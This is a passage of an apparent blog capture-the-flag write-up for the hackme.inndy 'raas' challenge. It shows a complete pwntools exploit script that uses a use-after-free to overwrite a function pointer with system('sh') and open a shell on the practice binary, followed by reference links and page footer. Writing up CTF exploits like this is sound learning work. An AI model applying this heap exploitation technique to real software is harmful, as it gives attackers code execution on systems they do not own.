+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">r=process(<span class="string">'./raas'</span>)</span><br><span class="line"><span class="comment"># r=remote('hackme.inndy.tw',7719)</span></span><br><span class="line">elf=ELF(<span class="string">'./raas'</span>)</span><br><span class="line">system=elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(Index,Type,Length,Value)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"Act &gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"Index &gt; "</span>,str(Index))</span><br><span class="line">	r.sendlineafter(<span class="string">"Type &gt; "</span>,str(Type))</span><br><span class="line">	<span class="keyword">if</span> Type==<span class="number">2</span>:</span><br><span class="line">		r.sendlineafter(<span class="string">"Length &gt; "</span>,str(Length))</span><br><span class="line">	r.sendlineafter(<span class="string">"Value &gt; "</span>,str(Value))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(Index)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"Act &gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"Index &gt; "</span>,str(Index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(Index)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"Act &gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"Index &gt; "</span>,str(Index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">20</span>,<span class="string">"0000"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="number">20</span>,<span class="string">"1111"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="string">'sh\x00\x00'</span>+p32(system))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a href="https://genowang.github.io/2019/01/01/hackme-inndy-tw-PWN%E7%AC%94%E8%AE%B0/#onepunch" target="_blank" rel="noopener">https://genowang.github.io/2019/01/01/hackme-inndy-tw-PWN%E7%AC%94%E8%AE%B0/#onepunch</a></li>
+<li><a href="https://blog.csdn.net/charlie_heng/article/details/78943796" target="_blank" rel="noopener">https://blog.csdn.net/charlie_heng/article/details/78943796</a></li>
+</ul>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hackme-inndy-raas-wp"><span class="toc-number">1.</span> <span class="toc-text">hackme.inndy raas wp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">1.0.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试"><span class="toc-number">1.0.2.</span> <span class="toc-text">调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.0.3.</span> <span class="toc-text">exp:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">1.0.4.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&text=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&title=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&is_video=false&description=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hackme.inndy raas wp&body=Check out this article: http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&title=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&title=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&title=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&title=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&name=hackme.inndy raas wp&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 zerokeeper
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zerokeeper';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
